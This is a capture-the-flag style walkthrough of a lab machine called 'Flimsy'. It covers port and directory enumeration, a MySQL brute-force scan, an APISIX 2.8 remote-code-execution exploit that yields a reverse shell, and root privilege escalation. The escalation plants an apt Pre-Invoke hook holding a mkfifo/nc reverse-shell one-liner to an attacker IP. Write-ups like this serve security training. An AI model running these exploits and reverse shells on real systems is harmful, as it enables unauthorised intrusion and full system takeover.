# Flimsy
## Information Gathering
#### Ports/Services
22/tcp      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp      http       nginx 1.18.0 (Ubuntu)

3306/tcp    mysql      MySQL (unauthorized)

8080/tcp closed http-proxy


## Enumeration
### Nmap scan
```bash
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-title: Site doesnt have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
```

### 22/tcp OpenSSH 8.2p1


### 80/tcp nginx 1.18.0
- Ran Gobuster
```bash
gobuster dir -u http://192.168.122.220/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,js,txt,bak,sh -o gob/tcp80_root.gob

/img                  (Status: 301) [Size: 178] [--> http://192.168.122.220/img/]
/index.html           (Status: 200) [Size: 50895]                                
/css                  (Status: 301) [Size: 178] [--> http://192.168.122.220/css/]
/js                   (Status: 301) [Size: 178] [--> http://192.168.122.220/js/] 
/slick                (Status: 301) [Size: 178] [--> http://192.168.122.220/slick/]
```

`/slick`
***
- Get 403 when attempting to connect
- Gobuster `/slick`
```bash
gobuster dir -u http://192.168.122.220/slick/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,js,txt,bak,sh,lua -o gob/tcp80_slick.gob

/fonts                (Status: 301) [Size: 178] [--> http://192.168.122.220/slick/fonts/]
/LICENSE              (Status: 200) [Size: 1071]
```

### 3306/tcp 
- Ran nmap scap against 3306
```bash
sudo nmap -p3306 --script=mysql-* 192.168.122.220 -oN nmap/tcp3306_mysql.nmap

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
|_mysql-empty-password: Host '192.168.49.122' is not allowed to connect to this MySQL server
| mysql-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 50009 guesses in 146 seconds, average tps: 335.5

```

### 43500/tcp
- According to full nmap scan - `OpenResty web app server`
- Looking at HTTP HEADER 
```bash
curl -I "http://192.168.122.220:43500/"

HTTP/1.1 404 Not Found
Date: Wed, 04 Jan 2023 01:58:05 GMT
Content-Type: text/plain; charset=utf-8
Connection: keep-alive
Server: APISIX/2.8
```

- Exploits for APISIX/2.8 
	- [RCE](https://www.exploit-db.com/exploits/50829) - TRUE POSITIVE
- Using exploit
```bash
./apisix_rce.py http://192.168.122.220:43500/ 192.168.49.122 53
```
- Catches a reverse shell
```bash
nc -lnvp 53
listening on [any] 53 ...
connect to [192.168.49.122] from (UNKNOWN) [192.168.122.220] 37688
id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
```

## Exploitation
- Using [this](https://www.exploit-db.com/exploits/50829) exploit, we can exploit a remote code execution vulnerability and catch a reverse shell
```bash
./apisix_rce.py http://192.168.122.220:43500/ 192.168.49.122 53
```
- Catches a reverse shell
```bash
nc -lnvp 53
listening on [any] 53 ...
connect to [192.168.49.122] from (UNKNOWN) [192.168.122.220] 37688
id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
```


## Privilege Escalation
### Enumeration
- Upon foothold, we drop right into `/root`
- Running linpeas.sh on the victim we get two interesting cronjobs running at all times
```bash
* * * * * root apt-get update
* * * * * root /root/run.sh
```
- At first I thought I had to use the exploit that got me foothold to write to `/root/run.sh`. 
- There is a great privilege escalation via `apt-get update` from this [article](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)
	- We do have write ability at `/etc/apt/apt.conf.d`
	- Writing a  payload to `pwn` - `echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.250 1234 >/tmp/f"};' > pwn`
	- After a few moments I caught a reverse shell as root